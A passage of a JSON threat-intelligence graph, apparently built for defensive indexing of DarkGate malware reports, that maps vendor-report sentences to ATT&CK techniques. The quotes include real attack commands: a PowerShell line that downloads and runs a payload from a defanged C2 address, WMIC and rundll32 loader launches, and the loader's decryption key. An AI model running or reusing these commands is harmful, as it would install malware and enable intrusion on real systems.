+              "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ab757af3e503",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "WMIC",
+        "edges": [
+          "EDGE_6a0052bf3bec"
+        ],
+        "source": {
+          "WMIC_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              3,
+              "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bb0c89cafac4",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Avast",
+        "edges": [
+          "EDGE_49f5e18a6217"
+        ],
+        "source": {
+          "Avast_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              22,
+              "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bf691056b8b7",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "AVG",
+        "edges": [
+          "EDGE_606c4950751b"
+        ],
+        "source": {
+          "AVG_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              22,
+              "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d055ddead613",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "VBScript",
+        "edges": [
+          "EDGE_57de22683d45",
+          "EDGE_f5592323015b"
+        ],
+        "source": {
+          "VBScript_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              0,
+              "The PDF file disguises itself as an invoice file dated “26 Jun2024” and contains a download button that redirects to a compromised website to download a malicious VBScript file."
+            ],
+            [
+              1,
+              "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0ca4c027698b",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Vision One",
+        "edges": [],
+        "source": {
+          "Vision One_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              0,
+              "Using Vision One, we observed a recent security incident in which a user was targeted by an attacker posing as an employee of a known client on a Microsoft Teams call."
+            ],
+            [
+              12,
+              "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_3d07e70c6afd",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Teams",
+        "edges": [],
+        "source": {
+          "Microsoft Teams_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              0,
+              "Using Vision One, we observed a recent security incident in which a user was targeted by an attacker posing as an employee of a known client on a Microsoft Teams call."
+            ],
+            [
+              5,
+              "The victim reported that she first received several thousands of emails, after which she received a call via Microsoft Teams from a caller claiming to be an employee of an external supplier."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_49884b2b2c2e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Microsoft",
+        "edges": [],
+        "source": {
+          "Microsoft_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              8,
+              "Impersonating IT support to potential victims following an email flood is a technique that has been previously disclosed in a Microsoft blog entry."
+            ],
+            [
+              38,
+              "The vishing technique has also been documented by Microsoft, in a case where the attacker utilized QuickAssist to gain access to its target to distribute ransomware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_64acfff3c451",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Remote Support application",
+        "edges": [],
+        "source": {
+          "Microsoft Remote Support application_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              6,
+              "During the call, the victim was instructed to download Microsoft Remote Support application, however, the installation via the Microsoft Store failed."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_81a771b6edd2",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "QuickAssist",
+        "edges": [],
+        "source": {
+          "QuickAssist_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              38,
+              "The vishing technique has also been documented by Microsoft, in a case where the attacker utilized QuickAssist to gain access to its target to distribute ransomware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9f19c2ded5ec",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Store",
+        "edges": [],
+        "source": {
+          "Microsoft Store_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              6,
+              "During the call, the victim was instructed to download Microsoft Remote Support application, however, the installation via the Microsoft Store failed."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b32d1902bb1c",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AnyDesk",
+        "edges": [
+          "EDGE_9d3398670138",
+          "EDGE_a87cdffceca2"
+        ],
+        "source": {
+          "AnyDesk_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              1,
+              "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+            ],
+            [
+              7,
+              "The attacker then instructed the victim to download AnyDesk via browser and manipulate the user to enter her credentials to AnyDesk."
+            ],
+            [
+              9,
+              "The execution of AnyDesk.exe was observed seconds after downloading the application."
+            ],
+            [
+              10,
+              "The command ran is as follows:\n“C:\\Users\\<user>\\Downloads\\AnyDesk.exe\" --local-service\nThis command runs the AnyDesk remote desktop application and starts it as a local service on the system, allowing it to operate with elevated privileges or in a minimized/automated fashion."
+            ],
+            [
+              11,
+              "A few minutes after, cmd.exe was invoked to execute rundll32.exe to load SafeStore.dll, which we assumed were dropped via AnyDesk.exe."
+            ],
+            [
+              14,
+              "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f490d3b65ad2__b1bd8746",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AutoIt",
+        "edges": [
+          "EDGE_9b06b729b70b",
+          "EDGE_d1dd5283ba8c",
+          "EDGE_e12e811509b8",
+          "EDGE_e822665e0329"
+        ],
+        "source": {
+          "AutoIt_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              2,
+              "DarkGate, distributed via an AutoIt script, enabled remote control over the user's machine, executed malicious commands, gathered system information, and connected to a command-and-control server."
+            ],
+            [
+              16,
+              "The encrypted AutoIt payload script.a3x decrypts itself in memory as shellcode and injects itself into remote processes."
+            ],
+            [
+              31,
+              "The file.zip was dropped to C:\\rbne\\dxqu\\ and contains a malicious AutoIt script."
+            ],
+            [
+              32,
+              "A few minutes later, an executable file, StaticSrv.exe (SHA256: faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b), dropped in the C:\\Users\\<user>\\ folder, was executed and invoked AutoIt3.exe to run script.a3x."
+            ]
+          ],
+          "AutoIT_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              30,
+              "Some reporting has shown that it has been distributed through AutoIT scripts, as have other Infostealers, however the method of distribution in that case is very different to the DarkGate use of AutoIT, and seems rather more technically advanced."
+            ]
+          ],
+          "AutoIt_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              8,
+              "These campaigns use AutoIt or AutoHotkey scripts to infect victims with DarkGate."
+            ]
+          ]
+        },
+        "alias": [
+          "AutoIT"
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1055",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1055",
+        "ttp_id": "T1055",
+        "best_span_sentences_list": [
+          [
+            "On 2023.08.04 WithSecure Managed Detection and Response identified suspicious code injection into multiple processes on a customer endpoint."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            10
+          ]
+        ],
+        "edges": [
+          "EDGE_21731cc62c08",
+          "EDGE_a236a2581008",
+          "EDGE_a40967744d6b",
+          "EDGE_b46a2ad45e6c",
+          "EDGE_c210be69bd87",
+          "EDGE_e12e811509b8"
+        ],
+        "source": {
+          "TTP:T1055_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                10,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "On 2023.08.04 WithSecure Managed Detection and Response identified suspicious code injection into multiple processes on a customer endpoint."
+              ]
+            ]
+          },
+          "TTP:T1055_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                16,
+                17
+              ],
+              [
+                22,
+                24
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The encrypted AutoIt payload script.a3x decrypts itself in memory as shellcode and injects itself into remote processes.",
+                "One observed example was the legitimate binary for MicrosoftEdgeUpdateCore.exe, located in C:\\Program Files (x86)\\Microsoft\\EdgeUpdate."
+              ],
+              [
+                "Autoit3.exe also executed the script.a3x to inject a process into MicrosoftEdgeUpdateCore.exe, which was then observed connecting to external IP 179.60.149[.]194:80, a C&C server.",
+                "processCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe.",
+                "A few minutes after the connection to IP 179.60.149[.]194, a VBScript was executed via cscript.exe:\nobjectCmd:cscript spamfilter_v1.4331.vbs\nBased on the contents of VBScript spamfilter_v1.4331.vbs file, it will run the PowerShell command, then run the script.a3x via Autoit3.exe."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "Initial triage by the Detection and Response Team (DRT) identified the presence of a suspicious VBS file and the harvesting of credentials from browser databases, suggesting the presence of an infostealer infection of some type."
+          ],
+          [
+            "The AutoIT compiled scripts used by the attacker are MSI files."
+          ],
+          [
+            "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            11,
+            11
+          ],
+          [
+            34,
+            34
+          ],
+          [
+            47,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_9b06b729b70b",
+          "EDGE_f278f73b7f7c",
+          "EDGE_1bcf824222e5",
+          "EDGE_1e62bad5f3ee",
+          "EDGE_57de22683d45",
+          "EDGE_66c0cc5e384a",
+          "EDGE_6c2d14a29d67",
+          "EDGE_f59cba8c5f27",
+          "EDGE_02a227c31e98",
+          "EDGE_278133f76de4",
+          "EDGE_3f5468d8ac7c",
+          "EDGE_8ad833c519b7"
+        ],
+        "source": {
+          "TTP:T1059_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                11,
+                11
+              ],
+              [
+                34,
+                34
+              ],
+              [
+                47,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Initial triage by the Detection and Response Team (DRT) identified the presence of a suspicious VBS file and the harvesting of credentials from browser databases, suggesting the presence of an infostealer infection of some type."
+              ],
+              [
+                "The AutoIT compiled scripts used by the attacker are MSI files."
+              ],
+              [
+                "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+              ]
+            ]
+          },
+          "TTP:T1059_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                8,
+                8
+              ],
+              [
+                14,
+                14
+              ],
+              [
+                16,
+                17
+              ],
+              [
+                19,
+                19
+              ],
+              [
+                21,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "These campaigns use AutoIt or AutoHotkey scripts to infect victims with DarkGate."
+              ],
+              [
+                "When a user clicks the hyperlinked object for the Open button in the spreadsheet, it retrieves and runs content from a URL found in the spreadsheet archive's drawing.xml.rels file."
+              ],
+              [
+                "Code from the .vbs or .js file downloads and runs a PowerShell script.",
+                "This PowerShell script downloads three files and uses them to start the AutoHotKey-based DarkGate package."
+              ],
+              [
+                "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+              ],
+              [
+                "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+              ]
+            ]
+          },
+          "TTP:T1059_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": {
+            "best_span_ranges": [
+              [
+                0,
+                1
+              ],
+              [
+                3,
+                3
+              ],
+              [
+                10,
+                10
+              ],
+              [
+                24,
+                24
+              ],
+              [
+                29,
+                29
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The PDF file disguises itself as an invoice file dated “26 Jun2024” and contains a download button that redirects to a compromised website to download a malicious VBScript file.",
+                "Figure 1: PDF file containing download link\nVBScript\nFunction names and variable names in VBScript code are obfuscated, and large comments are added to harden the readability of the code."
+              ],
+              [
+                "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+              ],
+              [
+                "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+              ],
+              [
+                "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+              ],
+              [
+                "If the value of flag 1 is \"yes,\" the malware retrieves the running executable path and script path from the process arguments to copy them into Autoit3.exe and AU3 script respectively into the main folder in \"c:\\ProgramData\"."
+              ]
+            ]
+          },
+          "TTP:T1059_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ],
+              [
+                10,
+                15
+              ],
+              [
+                19,
+                19
+              ],
+              [
+                22,
+                25
+              ],
+              [
+                32,
+                32
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware.",
+                "DarkGate, distributed via an AutoIt script, enabled remote control over the user's machine, executed malicious commands, gathered system information, and connected to a command-and-control server."
+              ],
+              [
+                "The command ran is as follows:\n“C:\\Users\\<user>\\Downloads\\AnyDesk.exe\" --local-service\nThis command runs the AnyDesk remote desktop application and starts it as a local service on the system, allowing it to operate with elevated privileges or in a minimized/automated fashion.",
+                "A few minutes after, cmd.exe was invoked to execute rundll32.exe to load SafeStore.dll, which we assumed were dropped via AnyDesk.exe.",
+                "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3).",
+                "There are multiple functions exported by the DLL that can be used to execute the malware (Figure 4).",
+                "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7).",
+                "After the script.a3x and AutoIt3.exe files are created, the malicious script script.a3x is executed via the command cmd c:\\temp\\test\\AutoIt3.exe c:\\temp\\test\\script.a3x."
+              ],
+              [
+                "Then, the following discovery commands were executed by Autoit3.exe:\nprocessCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\nobjectCmd: \"c:\\windows\\system32\\cmd.exe\" /c wmic ComputerSystem get domain > C:\\ProgramData\\fcdcdfc\\kcbbbbc\nThis command retrieves information about the system's domain and saves the output to the file kcbbbbc inside the folder C:\\ProgramData\\fcdcdfc."
+              ],
+              [
+                "Autoit3.exe also executed the script.a3x to inject a process into MicrosoftEdgeUpdateCore.exe, which was then observed connecting to external IP 179.60.149[.]194:80, a C&C server.",
+                "processCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe.",
+                "A few minutes after the connection to IP 179.60.149[.]194, a VBScript was executed via cscript.exe:\nobjectCmd:cscript spamfilter_v1.4331.vbs\nBased on the contents of VBScript spamfilter_v1.4331.vbs file, it will run the PowerShell command, then run the script.a3x via Autoit3.exe.",
+                "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+              ],
+              [
+                "A few minutes later, an executable file, StaticSrv.exe (SHA256: faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b), dropped in the C:\\Users\\<user>\\ folder, was executed and invoked AutoIt3.exe to run script.a3x."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_071f97d4e2a0",
+          "EDGE_24a49b3fe4ab",
+          "EDGE_5592e6fa2ce6",
+          "EDGE_5eb61232194a",
+          "EDGE_68981a58e34e",
+          "EDGE_9338665c4c95",
+          "EDGE_97ae1aa30a94",
+          "EDGE_bdd93619879f",
+          "EDGE_c6e17b1b7a07",
+          "EDGE_755eed7ad7f0"
+        ],
+        "source": {
+          "TTP:T1071_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                47,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+              ]
+            ]
+          },
+          "TTP:T1071_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ],
+              [
+                42,
+                42
+              ],
+              [
+                45,
+                45
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This article reviews a DarkGate malware campaign from March-April 2024 that uses Microsoft Excel files to download a malicious software package from public-facing SMB file shares."
+              ],
+              [
+                "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+              ],
+              [
+                "In our infection run March 14, 2024, we saw what appears to have been data exfiltration in five HTTP POST requests sending nearly 218 KB of data as shown below in Figure 15."
+              ]
+            ]
+          },
+          "TTP:T1071_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                22,
+                22
+              ],
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Autoit3.exe also executed the script.a3x to inject a process into MicrosoftEdgeUpdateCore.exe, which was then observed connecting to external IP 179.60.149[.]194:80, a C&C server."
+              ],
+              [
+                "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1078",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1078",
+        "ttp_id": "T1078",
+        "best_span_sentences_list": [
+          [
+            "Ducktail is a dedicated infostealer, it is in no way stealthy, and upon execution it will rapidly steal credentials and session cookies from the local device and send them back to the attacker.",
+            "It has an additional Facebook Business account focused function whereby if it locates a Facebook Business account session cookie it will attempt to add the attacker to the account as an administrator, and even has functionality to automatically create and publish fraudulent ad campaigns sent by the actor to the compromised device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            17
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1078_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                16,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Ducktail is a dedicated infostealer, it is in no way stealthy, and upon execution it will rapidly steal credentials and session cookies from the local device and send them back to the attacker.",
+                "It has an additional Facebook Business account focused function whereby if it locates a Facebook Business account session cookie it will attempt to add the attacker to the account as an administrator, and even has functionality to automatically create and publish fraudulent ad campaigns sent by the actor to the compromised device."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1098",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1098",
+        "ttp_id": "T1098",
+        "best_span_sentences_list": [
+          [
+            "It has an additional Facebook Business account focused function whereby if it locates a Facebook Business account session cookie it will attempt to add the attacker to the account as an administrator, and even has functionality to automatically create and publish fraudulent ad campaigns sent by the actor to the compromised device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_02c9a10f4a92"
+        ],
+        "source": {
+          "TTP:T1098_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                17,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It has an additional Facebook Business account focused function whereby if it locates a Facebook Business account session cookie it will attempt to add the attacker to the account as an administrator, and even has functionality to automatically create and publish fraudulent ad campaigns sent by the actor to the compromised device."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "The URL seen during delivery of the malicious files was g2[.]by/corsair-JD."
+          ],
+          [
+            "All of the LNK files in the below table connect to hxxp://5.188.87[.]58:2351/ and download an MSI file."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            24
+          ],
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_5d2998355e15",
+          "EDGE_66b3e3443dfe",
+          "EDGE_70d3b32a4f71",
+          "EDGE_c4afabd72079",
+          "EDGE_e4487747a411",
+          "EDGE_3623380b8d0a",
+          "EDGE_3713586ec5e6",
+          "EDGE_40422d3334f9",
+          "EDGE_5fc10c51cc86",
+          "EDGE_027171b747c2",
+          "EDGE_8b828e6b695d",
+          "EDGE_9a889c40df87",
+          "EDGE_9d3398670138",
+          "EDGE_f76365e52b8b"
+        ],
+        "source": {
+          "TTP:T1105_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                24,
+                24
+              ],
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The URL seen during delivery of the malicious files was g2[.]by/corsair-JD."
+              ],
+              [
+                "All of the LNK files in the below table connect to hxxp://5.188.87[.]58:2351/ and download an MSI file."
+              ]
+            ]
+          },
+          "TTP:T1105_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ],
+              [
+                10,
+                10
+              ],
+              [
+                16,
+                17
+              ],
+              [
+                21,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This article reviews a DarkGate malware campaign from March-April 2024 that uses Microsoft Excel files to download a malicious software package from public-facing SMB file shares."
+              ],
+              [
+                "Starting in March 2024, we saw a campaign using servers running open Samba file shares hosting files used for DarkGate infections."
+              ],
+              [
+                "Code from the .vbs or .js file downloads and runs a PowerShell script.",
+                "This PowerShell script downloads three files and uses them to start the AutoHotKey-based DarkGate package."
+              ],
+              [
+                "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+              ]
+            ]
+          },
+          "TTP:T1105_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+              ],
+              [
+                "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1539",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1539",
+        "ttp_id": "T1539",
+        "best_span_sentences_list": [
+          [
+            "Ducktail is a dedicated infostealer, it is in no way stealthy, and upon execution it will rapidly steal credentials and session cookies from the local device and send them back to the attacker."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1539_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Ducktail is a dedicated infostealer, it is in no way stealthy, and upon execution it will rapidly steal credentials and session cookies from the local device and send them back to the attacker."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "DarkGate attempts to be stealthy, it tries to achieve persistence, it has been used for a variety of purposes, and has reportedly been used by attackers to deploy Cobalt Strike and ransomware."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_d5c2cb520fc7"
+        ],
+        "source": {
+          "TTP:T1547_labs.withsecure.com_publications_darkgate-malware-campaign": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "DarkGate attempts to be stealthy, it tries to achieve persistence, it has been used for a variety of purposes, and has reportedly been used by attackers to deploy Cobalt Strike and ransomware."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1555",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1555",
+        "ttp_id": "T1555",
+        "best_span_sentences_list": [
+          [
+            "Initial triage by the Detection and Response Team (DRT) identified the presence of a suspicious VBS file and the harvesting of credentials from browser databases, suggesting the presence of an infostealer infection of some type."
+          ]
+        ],
